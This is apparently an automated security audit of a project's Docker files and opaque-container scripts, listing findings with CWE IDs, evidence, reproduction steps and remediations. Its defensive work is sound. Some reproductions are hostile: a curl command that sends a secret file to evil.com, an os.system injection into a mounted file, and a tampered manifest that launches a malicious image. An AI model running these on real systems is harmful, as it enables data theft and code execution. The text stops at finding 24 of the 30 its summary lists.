# A05 — Docker & Container Security Audit

> **Agent**: Agent 5 — Docker & Container
> **Phase**: 2 (Protocol & App & Infra)
> **Priority**: CRITICAL
> **Auditor**: Ralph Loop — Iteration 15
> **Date**: 2026-03-01
> **Files Audited**: `Dockerfile`, `docker-compose.yml`, `.dockerignore`, `examples/opaque-containers/Dockerfile.example`, `examples/opaque-containers/build-opaque.sh`, `examples/opaque-containers/run-opaque.sh`, `examples/opaque-containers/LICENSED_CONTAINERS.md`
> **Skills Used**: `/skill-dockerfile-security-auditor`
> **CIS Docker Benchmark Score**: 3/12 PASS, 1 PARTIAL, 8 FAIL

---

## Summary

| Severity | Count | Finding IDs |
|----------|-------|-------------|
| HIGH | 2 | SHIELD-A05-001, SHIELD-A05-002 |
| MEDIUM | 15 | SHIELD-A05-003, SHIELD-A05-004, SHIELD-A05-006, SHIELD-A05-007, SHIELD-A05-008, SHIELD-A05-014, SHIELD-A05-015, SHIELD-A05-016, SHIELD-A05-017, SHIELD-A05-021, SHIELD-A05-022, SHIELD-A05-024, SHIELD-A05-025, SHIELD-A05-026, SHIELD-A05-029 |
| LOW | 9 | SHIELD-A05-005, SHIELD-A05-009, SHIELD-A05-010, SHIELD-A05-011, SHIELD-A05-018, SHIELD-A05-019, SHIELD-A05-023, SHIELD-A05-027, SHIELD-A05-028 |
| INFO | 4 | SHIELD-A05-012, SHIELD-A05-013, SHIELD-A05-020, SHIELD-A05-030 |
| **Total** | **30** | |

---

## Findings

### SHIELD-A05-001: Container Runs as Root — No USER Directive

- **Severity**: HIGH
- **CWE**: CWE-250 (Execution with Unnecessary Privileges)
- **Location**: `Dockerfile:4-52` (entire file), `examples/opaque-containers/Dockerfile.example:4-41` (entire file)
- **Tag**: VULN / VERIFIED
- **Evidence**:
```dockerfile
# Dockerfile — no USER directive anywhere
FROM ubuntu:22.04
# ... all commands run as root ...
WORKDIR /shield
COPY . .
RUN cd python && pip3 install -e ".[dev]"
RUN cd javascript && npm ci
CMD ["bash", "-c", "..."]
# No USER directive — container runs as root

# Dockerfile.example — same issue
FROM alpine:latest
RUN cat > /app/secret-algorithm.sh <<'EOF'
# ...
EOF
CMD ["/app/secret-algorithm.sh"]
# No USER directive
```
- **Impact**: Container processes run as UID 0. If an attacker escapes the container via a kernel vulnerability or misconfiguration, they gain root on the host. npm/pip running as root can execute arbitrary post-install scripts with full privileges.
- **Reproduction**: `docker inspect $(docker build -q .) | jq '.[0].Config.User'` → returns `""`
- **Fix Complexity**: LOW
- **Remediation**: Add `RUN useradd -r -s /bin/false shield && USER shield` after package installation. For Dockerfile.example: `RUN adduser -D -s /bin/false shield && USER shield`.

---

### SHIELD-A05-002: Curl-Pipe-to-Shell Pattern for Rust Installation

- **Severity**: HIGH
- **CWE**: CWE-494 (Download of Code Without Integrity Check)
- **Location**: `Dockerfile:30`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```dockerfile
RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
```
- **Impact**: If rustup.rs is compromised or a MITM occurs (despite TLS), arbitrary code executes as root during build. No checksum verification of the downloaded installer. Build-time supply chain attack vector.
- **Reproduction**: The pattern is visible at `Dockerfile:30`. No SHA verification step follows.
- **Fix Complexity**: MEDIUM
- **Remediation**: Use official Rust Docker image (`FROM rust:1.77` or multi-stage with `COPY --from=rust:1.77 /usr/local/cargo /usr/local/cargo`), or download installer to file, verify SHA-256, then execute.

---

### SHIELD-A05-003: No Multi-Stage Build — Dev Dependencies in Production Image

- **Severity**: MEDIUM
- **CWE**: CWE-1104 (Use of Unmaintained Third Party Components) / CWE-250
- **Location**: `Dockerfile:13-27`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```dockerfile
RUN apt-get update && apt-get install -y \
    build-essential \
    curl \
    git \
    pkg-config \
    libssl-dev \
    python3 \
    python3-pip \
    python3-venv \
    nodejs \
    npm \
    golang-go \
    default-jdk \
    gradle \
    && rm -rf /var/lib/apt/lists/*
```
- **Impact**: Final image contains compilers (`build-essential`), package managers (`pip`, `npm`, `gradle`), and VCS tools (`git`, `curl`) — all unnecessary at runtime. Attack surface is massively expanded: an attacker in the container has full toolchains to download and compile exploits.
- **Reproduction**: `docker run --rm $(docker build -q .) which gcc curl git` → all found
- **Fix Complexity**: MEDIUM
- **Remediation**: Use multi-stage build. Build stage installs dev tools; final stage copies only compiled artifacts and runtime dependencies.

---

### SHIELD-A05-004: Unpinned Base Images — Tag Mutability and `latest` Tag

- **Severity**: MEDIUM
- **CWE**: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **Location**: `Dockerfile:4`, `examples/opaque-containers/Dockerfile.example:4`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```dockerfile
# Dockerfile — version tag but no digest
FROM ubuntu:22.04

# Dockerfile.example — uses mutable 'latest' tag
FROM alpine:latest
```
- **Impact**: `ubuntu:22.04` is a mutable tag — Ubuntu can push new images under the same tag. `alpine:latest` is worse — it changes with every Alpine release. Both allow silent image replacement, enabling supply chain attacks or introducing breaking changes. No digest pinning means builds are non-reproducible.
- **Reproduction**: Build today, build tomorrow — potentially different base images.
- **Fix Complexity**: LOW
- **Remediation**: Pin with digest: `FROM ubuntu:22.04@sha256:<digest>`. For example: `FROM alpine:3.19@sha256:<digest>`.

---

### SHIELD-A05-005: Missing HEALTHCHECK Directive

- **Severity**: LOW
- **CWE**: N/A (operational best practice, CIS 4.6)
- **Location**: `Dockerfile` (absent), `examples/opaque-containers/Dockerfile.example` (absent)
- **Tag**: VULN / VERIFIED
- **Evidence**: Neither Dockerfile contains a `HEALTHCHECK` instruction. `grep -c HEALTHCHECK Dockerfile` → `0`.
- **Impact**: Docker and orchestrators (Kubernetes, ECS) cannot detect if the application inside the container has become unresponsive. Unhealthy containers continue receiving traffic. For the opaque container use case, a crashed `shield decrypt` leaves the container in an undefined state.
- **Fix Complexity**: LOW
- **Remediation**: Add `HEALTHCHECK --interval=30s --timeout=5s CMD cargo test --no-run 2>/dev/null || exit 1` or appropriate health endpoint check.

---

### SHIELD-A05-006: Password Exposed via echo to stdin — Visible in Process List

- **Severity**: MEDIUM
- **CWE**: CWE-522 (Insufficiently Protected Credentials)
- **Location**: `examples/opaque-containers/build-opaque.sh:112`, `examples/opaque-containers/run-opaque.sh:115`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
# build-opaque.sh:112
echo "$SHIELD_PASSWORD" | shield encrypt \
    --input "${OUTPUT_NAME}.tar" \
    --output "${OUTPUT_NAME}.enc" \
    --service "${IMAGE_NAME}-container" \
    --password-from-stdin \
    $ENCRYPT_OPTS

# run-opaque.sh:115
echo "$SHIELD_PASSWORD" | shield decrypt \
    --input "$ENCRYPTED_FILE" \
    --output "${TEMP_DIR}/${BASE_NAME}.tar" \
    --password-from-stdin
```
- **Impact**: `echo "$SHIELD_PASSWORD"` creates a short-lived process with the password visible in `/proc/<pid>/cmdline`. On multi-user systems or containers with shared PID namespace, any user can read the password via `ps aux`. The `SHIELD_PASSWORD` environment variable is also visible via `/proc/<pid>/environ`.
- **Reproduction**: In one terminal: `export SHIELD_PASSWORD=secret && ./build-opaque.sh test:1.0`. In another: `ps aux | grep echo` — password visible.
- **Fix Complexity**: LOW
- **Remediation**: Use `printf '%s' "$SHIELD_PASSWORD"` (no process spawn) or heredoc `<<< "$SHIELD_PASSWORD"` (bash herestring, no process). Better: use file descriptor `shield encrypt --password-fd 3 3<<< "$SHIELD_PASSWORD"`.

---

### SHIELD-A05-007: Unquoted Variable Expansion — Word Splitting / Injection Risk

- **Severity**: MEDIUM
- **CWE**: CWE-78 (OS Command Injection)
- **Location**: `examples/opaque-containers/build-opaque.sh:117`, `examples/opaque-containers/run-opaque.sh:189`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
# build-opaque.sh:117 — $ENCRYPT_OPTS unquoted
shield encrypt \
    --input "${OUTPUT_NAME}.tar" \
    --output "${OUTPUT_NAME}.enc" \
    --service "${IMAGE_NAME}-container" \
    --password-from-stdin \
    $ENCRYPT_OPTS          # <-- unquoted, subject to word splitting and globbing

# run-opaque.sh:189 — $RUN_OPTS unquoted
docker run --rm $RUN_OPTS "$IMAGE_TAG"    # <-- unquoted
```
- **Impact**: Unquoted variables undergo word splitting and pathname expansion. If `$ENCRYPT_OPTS` or `$RUN_OPTS` contain glob characters or spaces in unexpected positions, commands may execute differently than intended. While currently controlled (set internally), this is a fragile pattern — any future modification passing user input through these variables enables injection.
- **Reproduction**: The `$RUN_OPTS` variable at run-opaque.sh:176-179 is intentionally multi-word (contains `--read-only`, `--security-opt=no-new-privileges`, etc.), so this is "working by accident" — the unquoting is relied upon for word splitting. This pattern breaks if any value contains spaces.
- **Fix Complexity**: LOW
- **Remediation**: Use bash arrays: `ENCRYPT_OPTS=()`, `ENCRYPT_OPTS+=(--fingerprint combined)`, then `"${ENCRYPT_OPTS[@]}"`.

---

### SHIELD-A05-008: JSON Injection in Manifest Generation

- **Severity**: MEDIUM
- **CWE**: CWE-78 (Injection)
- **Location**: `examples/opaque-containers/build-opaque.sh:138-153`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
cat > "${OUTPUT_NAME}.manifest.json" <<MANIFEST
{
  "name": "$IMAGE_NAME",
  "version": "$IMAGE_VERSION",
  "encrypted": true,
  "immutable": $IMMUTABLE,
  "fingerprint": $FINGERPRINT,
  "tee": $TEE,
  "platform": "$PLATFORM",
  "sha256": "$SHA256",
  "created": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "encrypted_size": $(stat -f%z "${OUTPUT_NAME}.enc" 2>/dev/null || stat -c%s "${OUTPUT_NAME}.enc"),
  "runtime": "docker",
  "shield_version": "2.1.0"
}
MANIFEST
```
- **Impact**: Variables `$IMAGE_NAME`, `$IMAGE_VERSION`, `$PLATFORM` are interpolated directly into JSON without escaping. An image tag containing `"` or `\` produces malformed JSON. A malicious image name like `myapp","exploit":"true` injects arbitrary JSON keys. The manifest is consumed by `run-opaque.sh` via `jq`, potentially altering behavior.
- **Reproduction**: `./build-opaque.sh 'my"app:1.0'` → produces invalid JSON manifest.
- **Fix Complexity**: LOW
- **Remediation**: Use `jq` to generate the manifest: `jq -n --arg name "$IMAGE_NAME" --arg version "$IMAGE_VERSION" '{name: $name, version: $version, ...}'`.

---

### SHIELD-A05-009: No Resource Limits in Docker-Compose

- **Severity**: LOW
- **CWE**: CWE-400 (Uncontrolled Resource Consumption)
- **Location**: `docker-compose.yml:4-75` (all 6 services)
- **Tag**: VULN / VERIFIED
- **Evidence**:
```yaml
services:
  test:
    build: .
    volumes:
      - .:/shield
    # No mem_limit, cpus, pids_limit, ulimits

  rust:
    build: .
    # No resource limits

  # ... same for python, javascript, interop, fastapi-example
```
- **Impact**: Any service can consume unlimited memory, CPU, and file descriptors. A malicious or buggy test could fork-bomb or OOM the host. The `interop` service runs `python3 run_interop_tests.py` with no resource constraints.
- **Fix Complexity**: LOW
- **Remediation**: Add `deploy.resources.limits` or legacy `mem_limit`/`cpus` to each service. Example: `mem_limit: 2g`, `cpus: '2'`, `pids_limit: 256`.

---

### SHIELD-A05-010: No Security Hardening in Docker-Compose Services

- **Severity**: LOW
- **CWE**: CWE-732 (Incorrect Permission Assignment)
- **Location**: `docker-compose.yml:4-75` (all 6 services)
- **Tag**: VULN / VERIFIED
- **Evidence**: No service specifies any of: `read_only: true`, `security_opt: [no-new-privileges]`, `cap_drop: [ALL]`, `tmpfs: /tmp`.
- **Impact**: Containers run with default Docker capabilities (14 capabilities including `SYS_CHOWN`, `NET_RAW`, `MKNOD`). An attacker who gains code execution inside a container has more capabilities than necessary. No read-only filesystem prevents runtime modification detection.
- **Fix Complexity**: LOW
- **Remediation**: Add to each service:
```yaml
security_opt:
  - no-new-privileges:true
cap_drop:
  - ALL
read_only: true
tmpfs:
  - /tmp
```

---

### SHIELD-A05-011: .dockerignore Missing Crypto Material Exclusions

- **Severity**: LOW
- **CWE**: CWE-538 (Insertion of Sensitive Information into Externally-Accessible File or Directory)
- **Location**: `.dockerignore:1-42`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```
# Current .dockerignore covers:
.git           ✓
.env           ✓
.env.*         ✓
node_modules/  ✓
target/        ✓

# MISSING:
*.key          ✗
*.pem          ✗
*.p12          ✗
*.pfx          ✗
*.jks          ✗
*.crt          ✗ (private certs)
findings/      ✗ (security assessment data)
.GM/           ✗ (recon data)
RALPH_*.md     ✗ (assessment state)
.beads/        ✗ (task tracking)
```
- **Impact**: `COPY . .` at `Dockerfile:38` copies the entire repo. Any private keys, certificates, or security assessment findings accidentally present in the repo root would be included in the Docker image layer. Docker layer history persists even after deletion in later layers.
- **Fix Complexity**: LOW
- **Remediation**: Add to `.dockerignore`: `*.key`, `*.pem`, `*.p12`, `*.pfx`, `*.jks`, `findings/`, `.GM/`, `RALPH_*.md`, `.beads/`.

---

### SHIELD-A05-012: Plaintext Container Retention Option

- **Severity**: INFO
- **CWE**: CWE-312 (Cleartext Storage of Sensitive Information)
- **Location**: `examples/opaque-containers/run-opaque.sh:40-42, 200-208`
- **Tag**: UN-VERIFIED (design decision)
- **Evidence**:
```bash
# run-opaque.sh:40-42
--keep-plaintext)
    KEEP_PLAINTEXT=true
    shift
    ;;

# run-opaque.sh:200-208
if [ "$KEEP_PLAINTEXT" = false ]; then
    echo "Cleaning up plaintext artifacts..."
else
    echo -e "${YELLOW}Plaintext kept at: ${TEMP_DIR}/${BASE_NAME}.tar${NC}"
    trap - EXIT   # Disables cleanup trap!
fi
```
- **Impact**: `--keep-plaintext` flag disables the trap that cleans up the decrypted container tar. The decrypted tar remains on disk indefinitely. This defeats the purpose of opaque containers by leaving plaintext artifacts accessible.
- **Fix Complexity**: LOW
- **Remediation**: Document this as "DEBUG ONLY" and add a warning. Consider requiring an additional confirmation flag or restricting to non-production builds.

---

### SHIELD-A05-013: Unpinned Package Versions in apt-get install

- **Severity**: INFO
- **CWE**: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **Location**: `Dockerfile:13-27`
- **Tag**: UN-VERIFIED (supply chain risk)
- **Evidence**:
```dockerfile
RUN apt-get update && apt-get install -y \
    build-essential \    # no version pin
    curl \               # no version pin
    git \                # no version pin
    # ... 11 more packages without version pins
```
- **Impact**: Builds are non-reproducible. Different builds on different days get different package versions. A compromised Ubuntu mirror could serve backdoored packages. Combined with SHIELD-A05-004 (unpinned base), the entire build is non-deterministic.
- **Fix Complexity**: MEDIUM (requires tracking specific versions)
- **Remediation**: Pin package versions: `curl=7.81.0-1ubuntu1.15` or use a lockfile approach. At minimum, pin critical security packages (curl, openssl).

---

## CIS Docker Benchmark Scorecard

| # | CIS Check | Status | Finding |
|---|-----------|--------|---------|
| 1 | Non-root USER directive | **FAIL** | SHIELD-A05-001 |
| 2 | Multi-stage build | **FAIL** | SHIELD-A05-003 |
| 3 | No curl-pipe-to-shell | **FAIL** | SHIELD-A05-002 |
| 4 | No secrets in ENV/ARG | **PASS** | — |
| 5 | HEALTHCHECK present | **FAIL** | SHIELD-A05-005 |
| 6 | Minimal/pinned base image | **FAIL** | SHIELD-A05-004 |
| 7 | Read-only root filesystem | **FAIL** | SHIELD-A05-010 |
| 8 | No --privileged | **PASS** | — |
| 9 | No host network mode | **PASS** | — |
| 10 | Secrets not in env vars | **FAIL** | SHIELD-A05-006 |
| 11 | Shell scripts proper quoting | **FAIL** | SHIELD-A05-007 |
| 12 | .dockerignore covers sensitive | **PARTIAL** | SHIELD-A05-011 |

**Score: 3/12 PASS, 1 PARTIAL, 8 FAIL**

---

## Known Finding Verification

| Known Finding | Status | Finding ID |
|---------------|--------|------------|
| Root user (no USER directive) | CONFIRMED | SHIELD-A05-001 |
| curl-pipe-to-shell pattern | CONFIRMED | SHIELD-A05-002 |
| Dev dependencies in production | CONFIRMED | SHIELD-A05-003 |
| Script injection surface | CONFIRMED | SHIELD-A05-007, SHIELD-A05-008 |
| No HEALTHCHECK | CONFIRMED | SHIELD-A05-005 |
| Secrets in build args/env | CONFIRMED (env, not ARG) | SHIELD-A05-006 |

All 6 known findings VERIFIED.

---

## TASK-2-005 Findings: Docker-Compose & Networking Security

> **Auditor**: Ralph Loop — Iteration 16
> **Date**: 2026-03-01
> **Target**: `docker-compose.yml`

---

### SHIELD-A05-014: No Network Segmentation — All Services on Default Bridge

- **Severity**: MEDIUM
- **CWE**: CWE-653 (Improper Isolation or Compartmentalization)
- **Location**: `docker-compose.yml:4-75` (all 6 services)
- **Tag**: VULN / VERIFIED
- **Evidence**:
```yaml
services:
  test:
    build: .
    # no 'networks:' key — uses default bridge
  # ...
  fastapi-example:
    ports:
      - "8000:8000"
    # no 'networks:' key — same default bridge as all others
# No custom networks defined anywhere in file
```
- **Impact**: All 6 services share the same default bridge network. The `fastapi-example` service exposes port 8000 to external traffic — any compromise of this service gives lateral access to `test`, `rust`, `python`, `javascript`, and `interop` services. No network boundary between the internet-facing example service and internal dev/test services. An attacker reaching `fastapi-example` can scan and connect to all other containers by service name (Docker DNS).
- **Reproduction**: `docker compose up -d && docker compose exec fastapi-example bash -c "apt-get update && apt-get install -y curl && curl http://rust:8080"` — can reach any service.
- **Fix Complexity**: LOW
- **Remediation**: Define separate networks and assign services to appropriate zones:
```yaml
networks:
  frontend:
  backend:
    internal: true
services:
  fastapi-example:
    networks: [frontend]
  test:
    networks: [backend]
  # etc.
```

---

### SHIELD-A05-015: Entire Repository Mounted Read-Write into Containers

- **Severity**: MEDIUM
- **CWE**: CWE-732 (Incorrect Permission Assignment for Critical Resource)
- **Location**: `docker-compose.yml:9` (test), `docker-compose.yml:24` (rust), `docker-compose.yml:53` (interop)
- **Tag**: VULN / VERIFIED
- **Evidence**:
```yaml
# test service (line 9)
volumes:
  - .:/shield          # entire repo, read-write

# rust service (line 24)
volumes:
  - .:/shield          # entire repo, read-write
  - cargo-cache:/root/.cargo/registry

# interop service (line 53)
volumes:
  - .:/shield          # entire repo, read-write
```
- **Impact**: The `.:/shield` bind mount exposes the ENTIRE repository — including `.git/` (commit history, hooks), `findings/` (security assessment data), `.GM/` (recon documents), `.env` files (if present despite .dockerignore — .dockerignore only applies to `COPY`, not volume mounts), and any private key files. Mounts are read-write: a compromised container can modify source code, inject malicious git hooks (`.git/hooks/pre-commit`), alter test scripts, or plant backdoors. Volume mounts bypass `.dockerignore` completely.
- **Reproduction**: `docker compose run test ls -la /shield/.git /shield/findings/ /shield/.GM/` — all accessible and writable.
- **Fix Complexity**: LOW
- **Remediation**: Mount only the specific subdirectory needed, and use read-only where possible:
```yaml
volumes:
  - ./shield-core:/shield/shield-core:ro
  - ./python:/shield/python:ro
```

---

### SHIELD-A05-016: FastAPI Example Bound to 0.0.0.0 with Debug Reload Mode

- **Severity**: MEDIUM
- **CWE**: CWE-489 (Active Debug Code)
- **Location**: `docker-compose.yml:64-72`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```yaml
fastapi-example:
  ports:
    - "8000:8000"         # binds to 0.0.0.0 on host by default
  command: >
    bash -c "
      pip install fastapi uvicorn &&
      cd /app/shield && pip install -e . &&
      cd /app/examples/fastapi &&
      uvicorn main:app --host 0.0.0.0 --port 8000 --reload
    "
```
- **Impact**: Three compounding risks: (1) `--host 0.0.0.0` listens on all container interfaces. (2) `ports: "8000:8000"` binds to all host interfaces — exposed to the entire LAN/network, not just localhost. (3) `--reload` enables uvicorn file watcher — any modification to mounted volume files triggers automatic application restart with the new code. An attacker with write access to the mounted `./python` or `./examples` directories achieves immediate code execution inside the container.
- **Reproduction**: From another machine on the same network: `curl http://<host-ip>:8000/docs` — FastAPI Swagger UI accessible. Modify a mounted file: `echo "import os; os.system('id')" >> examples/fastapi/main.py` — uvicorn auto-reloads and executes.
- **Fix Complexity**: LOW
- **Remediation**: Bind to localhost only: `ports: ["127.0.0.1:8000:8000"]`. Remove `--reload` for non-development use. Add read-only volume mount.

---

### SHIELD-A05-017: Runtime Package Installation Without Integrity Verification

- **Severity**: MEDIUM
- **CWE**: CWE-494 (Download of Code Without Integrity Check)
- **Location**: `docker-compose.yml:36-38` (python), `docker-compose.yml:67-69` (fastapi-example)
- **Tag**: VULN / VERIFIED
- **Evidence**:
```yaml
# python service (lines 36-38)
command: >
  bash -c "
    pip install -e '.[dev]' &&
    python -m pytest --watch
  "

# fastapi-example service (lines 67-69)
command: >
  bash -c "
    pip install fastapi uvicorn &&
    cd /app/shield && pip install -e . &&
    ...
  "
```
- **Impact**: Every container restart triggers `pip install` from PyPI with no `--require-hashes`, no version pins, and no pre-built lockfile. A supply chain attack on PyPI (dependency confusion, typosquatting, or compromised package) affects every developer who runs `docker compose up`. The `fastapi-example` installs `fastapi` and `uvicorn` without version constraints — any malicious release is immediately pulled. Combined with root execution (A05-001), pip post-install scripts run as root.
- **Reproduction**: `docker compose up python` — observe pip downloading packages from PyPI on every run. `pip install fastapi==99.99.99` would attempt to install a non-existent (or malicious) version.
- **Fix Complexity**: LOW
- **Remediation**: Pin versions in requirements files: `pip install -r requirements.txt --require-hashes`. Or build dependencies into the image with `RUN pip install` in a Dockerfile stage.

---

### SHIELD-A05-018: Cargo Cache Named Volume Confirms Root and Persists Untrusted Crates

- **Severity**: LOW
- **CWE**: CWE-250 (Execution with Unnecessary Privileges)
- **Location**: `docker-compose.yml:25`, `docker-compose.yml:74-75`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```yaml
# rust service (line 25)
volumes:
  - cargo-cache:/root/.cargo/registry   # <-- /root/ confirms UID 0

# global volumes (lines 74-75)
volumes:
  cargo-cache:    # named volume persists between runs
```
- **Impact**: (1) Mount path `/root/.cargo/registry` confirms container runs as root (cross-ref SHIELD-A05-001). (2) The `cargo-cache` named volume persists across container restarts. If a malicious crate is fetched (via dependency confusion or compromised registry), it remains cached and is reused in subsequent builds without re-verification. Volume data survives `docker compose down` — only `docker compose down -v` clears it.
- **Reproduction**: `docker volume inspect shield_cargo-cache` — shows persistent data. `docker compose run rust ls -la /root/.cargo/registry/` — shows cached crates from previous runs.
- **Fix Complexity**: LOW
- **Remediation**: Use non-root user path (e.g., `/home/shield/.cargo/registry`). Consider adding periodic cache validation or using `cargo-audit` in the build process.

---

### SHIELD-A05-019: Host Port Binding Exposes Service Beyond Localhost

- **Severity**: LOW
- **CWE**: CWE-668 (Exposure of Resource to Wrong Sphere)
- **Location**: `docker-compose.yml:64-65`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```yaml
fastapi-example:
  ports:
    - "8000:8000"    # equivalent to 0.0.0.0:8000:8000
```
- **Impact**: Docker maps `"8000:8000"` to `0.0.0.0:8000` on the host by default, bypassing host firewall rules on Linux (`iptables` chains are modified by Docker). The Shield FastAPI example service becomes accessible to the entire network. On macOS, Docker Desktop's VM networking partially mitigates this, but on Linux production hosts this is directly exploitable. This is a development convenience that becomes a security issue if docker-compose.yml is used in staging/CI environments.
- **Reproduction**: `docker compose up fastapi-example && nmap -p 8000 <host-ip>` — port 8000 open from external network.
- **Fix Complexity**: LOW
- **Remediation**: Bind to localhost: `ports: ["127.0.0.1:8000:8000"]`.

---

### SHIELD-A05-020: No Docker-Compose Version Pinning or Lockfile

- **Severity**: INFO
- **CWE**: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **Location**: `docker-compose.yml:2`
- **Tag**: UN-VERIFIED (best practice)
- **Evidence**:
```yaml
version: '3.8'
```
- **Impact**: The compose file specifies `version: '3.8'` but this is a schema version, not a Docker Compose engine version. Different Docker Compose versions (V1 vs V2) may interpret the same file differently. No `docker-compose.override.yml` lockfile or pinning mechanism exists. Combined with unpinned base images (A05-004) and unpinned packages (A05-013), the entire development environment is non-reproducible.
- **Fix Complexity**: LOW
- **Remediation**: Document required Docker Compose version in README. Consider adding a `Makefile` wrapper that checks `docker compose version` before running.

---

## TASK-2-006 Findings: Opaque Container Examples Security

> **Auditor**: Ralph Loop — Iteration 17
> **Date**: 2026-03-01
> **Target**: `examples/opaque-containers/*` (build-opaque.sh, run-opaque.sh, Dockerfile.example, LICENSED_CONTAINERS.md, DEMO.md, README.md)

---

### SHIELD-A05-021: Plaintext Tar Deleted with rm, Not Secure Wipe — Recoverable from Disk

- **Severity**: MEDIUM
- **CWE**: CWE-459 (Incomplete Cleanup)
- **Location**: `examples/opaque-containers/build-opaque.sh:159`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
# build-opaque.sh:159
rm -f "${OUTPUT_NAME}.tar"
```
- **Impact**: `rm -f` only removes the directory entry — the plaintext container tar (potentially containing proprietary algorithms, ML models, trading strategies) remains physically on disk until overwritten by the filesystem. On SSDs, wear-leveling can preserve data across multiple block writes. A disk forensics tool (e.g., `testdisk`, `photorec`) can recover the complete plaintext container after deletion. This directly undermines the "opaque container" security claim — the entire container was temporarily plaintext and is recoverable.
- **Reproduction**: `./build-opaque.sh myapp:1.0 && sync && testdisk /dev/sdX` — search for recently deleted .tar files. Or: `ls -la /proc/<build-pid>/fd/` during the brief window between `docker save` and `rm`.
- **Fix Complexity**: LOW
- **Remediation**: Use `shred -u "${OUTPUT_NAME}.tar"` (3-pass overwrite + unlink) or `dd if=/dev/urandom of="${OUTPUT_NAME}.tar" bs=1M count=$(stat -c%s "${OUTPUT_NAME}.tar" 2>/dev/null | awk '{printf "%d\n", $1/1048576+1}') && rm -f "${OUTPUT_NAME}.tar"`. Note: `shred` is ineffective on SSDs and CoW filesystems — document this limitation. For SSD environments, recommend full-disk encryption (LUKS/FileVault) as the underlying protection layer.

---

### SHIELD-A05-022: Manifest Integrity Not Protected — Tamperable Image Tag Injection

- **Severity**: MEDIUM
- **CWE**: CWE-345 (Insufficient Verification of Data Authenticity)
- **Location**: `examples/opaque-containers/run-opaque.sh:147-160`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
# run-opaque.sh:147-160 — manifest consumed without authentication
if [ -f "$MANIFEST_FILE" ]; then
    IMAGE_NAME=$(jq -r '.name' "$MANIFEST_FILE")
    IMAGE_VERSION=$(jq -r '.version' "$MANIFEST_FILE")
    IMAGE_TAG="${IMAGE_NAME}:${IMAGE_VERSION}"
    IS_IMMUTABLE=$(jq -r '.immutable' "$MANIFEST_FILE")
    # ...
else
    # Fallback: trust latest image in docker
    IMAGE_TAG=$(docker images --format "{{.Repository}}:{{.Tag}}" | head -1)
```
- **Impact**: The manifest file is generated alongside the encrypted container (build-opaque.sh:138-153) but is NOT encrypted or MAC-protected. An attacker who can modify the manifest can: (1) Change `IMAGE_TAG` to point to a malicious image already loaded in Docker. (2) Set `immutable: false` to disable read-only filesystem protection even when the original build used `--immutable`. (3) The fallback at line 159 is worse — it picks `docker images | head -1`, which is the most recently pulled image, potentially attacker-controlled. The SHA-256 file (line 92-93) only verifies the `.enc` file integrity, NOT the manifest.
- **Reproduction**: `echo '{"name":"malicious","version":"latest","immutable":false}' > myapp-1.0.manifest.json && ./run-opaque.sh myapp-1.0.enc` — loads and runs `malicious:latest` instead.
- **Fix Complexity**: MEDIUM
- **Remediation**: Include manifest hash inside the encrypted container, or compute HMAC of manifest with the same key. Verify manifest authenticity before parsing. Remove the `docker images | head -1` fallback — fail hard if no manifest exists.

---

### SHIELD-A05-023: Trap Expansion at Definition Time — Race Condition in Temp Cleanup

- **Severity**: LOW
- **CWE**: CWE-367 (Time-of-Check Time-of-Use Race Condition)
- **Location**: `examples/opaque-containers/run-opaque.sh:87`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
# run-opaque.sh:86-87
TEMP_DIR=$(mktemp -d)
trap "rm -rf ${TEMP_DIR}" EXIT
```
- **Impact**: `${TEMP_DIR}` is expanded when the trap is **defined**, not when it's **executed**. If `TEMP_DIR` were reassigned later (defensive coding concern), the trap would still delete the original directory. More critically, the double-quoted trap with variable expansion means the path is baked in as a string literal. If `mktemp` returns a path containing spaces or special characters (unlikely on most systems but possible with custom TMPDIR), the `rm -rf` could affect unintended paths. Additionally, the decrypted plaintext container tar sits in `$TEMP_DIR` — any process on the system can access `/tmp/tmp.XXXXXX/` between decryption (line 115) and Docker load (line 141).
- **Reproduction**: `TMPDIR="/tmp/path with spaces" ./run-opaque.sh test.enc` — trap cleanup fails due to word splitting.
- **Fix Complexity**: LOW
- **Remediation**: Use single quotes and escape: `trap 'rm -rf "$TEMP_DIR"' EXIT`. Set restrictive permissions: `chmod 700 "$TEMP_DIR"` immediately after creation.

---

### SHIELD-A05-024: Decrypted Container Has No Network Isolation by Default

- **Severity**: MEDIUM
- **CWE**: CWE-653 (Improper Isolation or Compartmentalization)
- **Location**: `examples/opaque-containers/run-opaque.sh:189`
- **Tag**: VULN / VERIFIED
- **Evidence**:
```bash
# run-opaque.sh:189
docker run --rm $RUN_OPTS "$IMAGE_TAG"

# Even in --immutable mode (lines 176-179), no --network flag:
RUN_OPTS="--read-only \
          --security-opt=no-new-privileges \
          --cap-drop=ALL \
          --tmpfs /tmp:rw,noexec,nosuid,size=100m"
```
- **Impact**: The decrypted "opaque" container runs with full Docker default networking — bridge network with outbound internet access. A compromised or malicious container can: (1) Exfiltrate decrypted secrets/algorithms to an external server. (2) Connect to internal services on the Docker network. (3) Phone home to a C2 server. This fundamentally undermines the opaque container security model — even if the container contents are encrypted at rest, once decrypted the container can freely transmit its own contents over the network. The `--immutable` mode adds read-only filesystem but does NOT restrict networking.
- **Reproduction**: Build and encrypt a container with `CMD ["curl", "https://evil.com/exfiltrate?data=$(cat /app/secret)"]`. Run via `./run-opaque.sh --immutable` — data exfiltrated despite "immutable" protections.
- **Fix Complexity**: LOW
- **Remediation**: Add `--network none` to default `RUN_OPTS` (or at least to immutable mode). If the container needs network access, require explicit opt-in: `./run-opaque.sh --allow-network`. Document the exfiltration risk prominently.

---

